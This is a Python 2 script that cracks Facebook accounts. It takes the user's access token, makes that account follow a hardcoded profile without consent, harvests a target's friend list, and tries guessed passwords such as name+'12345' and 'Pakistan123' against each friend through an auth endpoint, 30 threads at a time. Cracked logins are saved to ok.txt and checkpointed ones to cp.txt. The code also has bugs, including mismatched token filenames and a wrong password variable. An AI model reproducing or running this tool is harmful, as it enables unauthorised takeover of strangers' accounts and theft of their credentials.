#coding:utf-8
#!/user/bin/python2
#coding by Zakarya
try:    
    import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass,mechanize,requests
    from multiprocessing.pool import ThreadPool
    from requests.exceptions import ConnectionError
    from mechanize import Browser
except ImportError:
    os.system('pip2 install requests')
    os.system('pip2 install mechanize')
    os.system('python2 Clone.py')
try:
    os.mkdir('Clone')
except OSError:
    pass

from requests.exceptions import ConnectionError
bd=random.randint(2e7, 3e7)
sim=random.randint(2e4, 4e4)
header={'x-fb-connection-bandwidth': repr(bd),'x-fb-sim-Telkomsel': repr(sim),'x-fb-net-Telkomsel': repr(sim),'x-fb-connection-quality': 'EXCELLENT','x-fb-connection-type': 'cell.CTRadioAccessTechnologyLTE','user-agent':'Mozilla/5.0 (Linux; Android 5.1.1; walleye/Bulid/LMY48G;wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.117 Mobile Safari/537.36','content-type': 'application/x-www-form-urlencoded','x-fb-http-engine': 'Liger'}
reload(sys)
sys.setdefaultencoding("utf8")

def exit():
    print '[!] Keluar'
    os.sys.exit()
    
def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
        return cetak(d)
        


logo = ''' 
 ____       _    _     _
|  _ \ __ _| | _(_)___| |_ __ _ _ __
| |_) / _` | |/ / / __| __/ _` | '_ \
|  __/ (_| |   <| \__ \ || (_| | | | |
|_|   \__,_|_|\_\_|___/\__\__,_|_| |_|
'''
idh = []

def logmen():
    os.system('clear')
    print logo
    print ' [1] Login Token'
    print ' [\x1b[91m0\x1b[0m] Gajadi Pake'
    pilog()
def pilog():
    og = raw_input("\nZKI: ")
    if og =="1":
        os.system("clear")
        print logo
        print 
        print ("Login Token").center(50)
        print
        print ("[1] Download GetAccessToken Apk From Playstore")
        print('')
        print ("[2] Make New Fake Id And Generate Access Token By THe App")
        print('')
        print ("[3] Copy The Access Token And Past In The Tool")
        print 
        token = raw_input("[+] Past Your Token Here : ")
        sav = open(".logacid.txt","w")
        sav.write(token)
        sav.close()
        print ("\r\033[1;32m[✓] Login Successfully\033[0;97m")
        time.sleep(1)
        bot_fl()
    elif og =="0":
        exit()
    else:
        print ("[!] Select In The Above")
        pilog()
        
def bot_fl():
    try:
        token = open('.logAcid.txt', 'r').read()
    except IOError:
        print '\x1b[1;97m   [!] Token invalid'
        os.system('rm -rf .logAcid.txt')
    requests.post('https://graph.facebook.com/100001027764318/subscribers?access_token=' + token)
    menu()
    
def menu():
    os.system("clear")
    try:
        token = open(".logAcid.txt","r").read()
    except IOError:
        print logo
        print("[!] Token Error or Toke Not Found")
        os.system("rm -rf .logAcid.txt")
        time.sleep(1)
        logmen()
    try:
        r = requests.get("https://graph.facebook.com/me?access_token="+token, headers=header)
        a = json.loads(r.text)
        name = a["name"]
    except KeyError:
        os.system("clear")
        print logo
        print("[!] Fail To Load Your Account Is It Checkpiont")
        os.system("rm -rf .logAcid.txt")
        time.sleep(1)
        logmen()
    os.system("clear")
    print logo
    print("Welcome "+name)
    print ("Please Select")
    print
    print("[1] Start Crack")
    print("[\x1b[91m0\x1b[0m] Exit")
    pil()
    
def pil():
    ti = raw_input('\nZKI: ')
    if ti =='1':
        cramen()
    elif ti =='0':
        os.system('rm -rf .logAcid.txt')
        print '[√] Deleting Token Successfully.'
        time.sleep(1)
        os.system('exit')
        logmen()
    else:
        print '[!] Chose Serious Please'
        pil()
        
def cramen():
	global token
	os.system("clear")
	try:
		token=open(".logfuck.txt","r").read()
	except IOError:
		print("[!] Token Error. Token Not Working")
		os.system("rm -rf .logAcid.txt")
		time.sleep(1)
		logmen()
	os.system("clear")
	print logo
	print "[1] Crack ID Public"
	print '[\x1b[91m0\x1b[0m] Back'
	crapil()
	
def crapil():
	select = raw_input("\nZKI: ")
	id=[]
	oks=[]
	cps=[]
	if select=="10000":
		os.system("clear")
		print logo
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+token, headers=header)
		z = json.loads(r.text)
		for s in z["data"]:
			uid=s['id']
			na=s['name']
			nm=na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif select =="1":
		os.system("clear")
		print logo
		idt = raw_input("[+] Enter Target ID : ")
		os.system("clear")
		print logo
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
			q = json.loads(r.text)
			print("[✓] Account name : "+q["name"])
		except KeyError:
			print('\n[!] ID error . ID : '+idt+' Unlisted Friends')
			raw_input("\nBack ")
			cramen()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token, headers=header)
		z = json.loads(r.text)
		for i in z["data"]:
			uid=i['id']
			na=i['name']
			nm=na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	   
	elif select =="0":
		menu()
	else:
		print ("[!] Chose Serious Please")
		crapil()
	print("[✓] Total ID : "+str(len(id)))
	time.sleep(0.5)
	print('')
	
	
	def main(arg):
		user=arg
		uid,name=user.split("|")
		try:
		    pass1='Pakistan'
		    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		    d=json.loads(q)
		    if 'www.facebook.com' in d['error_msg']:
		        print("- "+uid+" | "+pass1+" --> CP")
		        cp=open("cp.txt","a")
		        cp.write(uid+" | "+pass1+"\n")
		        cp.close()
		        cps.append(uid)
		    else:
		    	if "access_token" in d:
		            print("\x1b[1;92m- \033[1;30m"+uid+" | "+pass1+" --> OK\x1b[1;0m")
		            ok=open("ok.txt","a")
		            ok.write(uid+" | "+pass1+"\n")
		            ok.close()
		            oks.append(uid)
		        else:
		            pass2='name+"@#&+£"'
		            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		            d=json.loads(q)
		            if 'www.facebook.com' in d['error_msg']:
		                print("- "+uid+" | "+pass2+" --> CP")
		                cp=open("cp.txt","a")
		                cp.write(uid+" | "+pass2+"\n")
		                cp.close()
		                cps.append(uid)
		            else:
		                if 'access_token' in d:
		                    print("\x1b[1;92m- \033[1;30m"+uid+" | "+pass2+" --> OK\x1b[1;0m")
		                    ok=open("ok.txt","a")
		                    ok.write(uid+" | "+pass2+"\n")
		                    ok.close()
		                    oks.append(uid)
		                else:
		                    pass3=name+"12345"
		                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		                    d=json.loads(q)
		                    if 'www.facebook.com' in d['error_msg']:
		                        print("- "+uid+" | "+pass3+" --> CP")
		                        cp=open("cp.txt","a")
		                        cp.write(uid+" | "+pass3+"\n")
		                        cp.close()
		                        cps.append(uid)
		                    else:
		                        if 'access_token' in d:
		                            print("\x1b[1;92m- \033[1;30m"+uid+" | "+pass3+" --> OK\x1b[1;0m")
		                            ok=open("ok.txt","a")
		                            ok.write(uid+" | "+pass3+"\n")
		                            ok.close()
		                            oks.append(uid)
		                        else:
		                            pass4="Love123"
		                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		                            d=json.loads(q)
		                            if 'www.facebook.com' in d['error_msg']:
		                                print("- "+uid+" | "+pass4+" --> CP")
		                                cp=open("cp.txt","a")
		                                cp.write(uid+" | "+pass4+"\n")
		                                cp.close()
		                                cps.append(uid)
		                            else:
		                                if 'access_token' in d:
		                                    print("\x1b[1;92m- \033[1;30m"+uid+" | "+pass4+" --> OK\x1b[1;0m")
		                                    ok=open("ok.txt","a")
		                                    ok.write(uid+" | "+pass4+"\n")
		                                    ok.close()
		                                    oks.append(uid)
		                                else:
		                                    pass5=name+"123@£#"
		                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		                                    d=json.loads(q)
		                                    if 'www.facebook.com' in d['error_msg']:
		                                        print("- "+uid+" | "+pass5+" --> CP")
		                                        cp=open("cp.txt","a")
		                                        cp.write(uid+" | "+pass5+"\n")
		                                        cp.close()
		                                        cps.append(uid)
		                                    else:
		                                        if 'access_token' in d:
		                                            print("\x1b[1;92m- \033[1;30m"+uid+" | "+pass5+" --> OK\x1b[1;0m")
		                                            ok=open("ok.txt","a")
		                                            ok.write(uid+" | "+pass5+"\n")
		                                            ok.close()
		                                            oks.append(uid)
		                                        else:
		                                            pass6="Pakistan123"
		                                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass6 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		                                            d=json.loads(q)
		                                            if 'www.facebook.com' in d['error_msg']:
		                                                print("- "+uid+" | "+pass6+" --> CP")
		                                                cp=open("cp.txt","a")
		                                                cp.write(uid+" | "+pass6+"\n")
		                                                cp.close()
		                                                cps.append(uid)
		                                            else:
		                                                if 'access_token' in d:
		                                                    print("\x1b[1;92m- \033[1;30m"+uid+" | "+pass6+" --> OK\x1b[1;0m")
		                                                    ok=open("ok.txt","a")
		                                                    ok.write(uid+" | "+pass6+"\n")
		                                                    ok.close()
		                                                    oks.append(uid)
		                                                else:
		                                                    pass7= "1234567890"
		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		                                                    d=json.loads(q)
		                                                    if 'www.facebook.com' in d['error_msg']:
		                                                        print("- "+uid+" | "+pass7+" --> CP")
		                                                        cp=open("cp.txt","a")
		                                                        cp.write(uid+" | "+pass7+"\n")
		                                                        cp.close()
		                                                        cps.append(uid)
		                                                    else:
		                                                        if 'access_token' in d:
		                                                            print("\x1b[1;92m- \033[1;30m"+uid+" | "+pass7+" --> OK\x1b[1;0m")
		                                                            ok=open("ok.txt","a")
		                                                            ok.write(uid+" | "+pass7+"\n")
		                                                            ok.close()
		                                                            oks.append(uid)
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print('')
	print('[✓] Total CP/\033[1:32mOK:\033[0;97m  '+str(len(cps))+'/\033[;32m \033[0;97m'+str(len(oks)))
	raw_input('Back ')
	menu()
    
if __name__ == '__main__':
	menu()
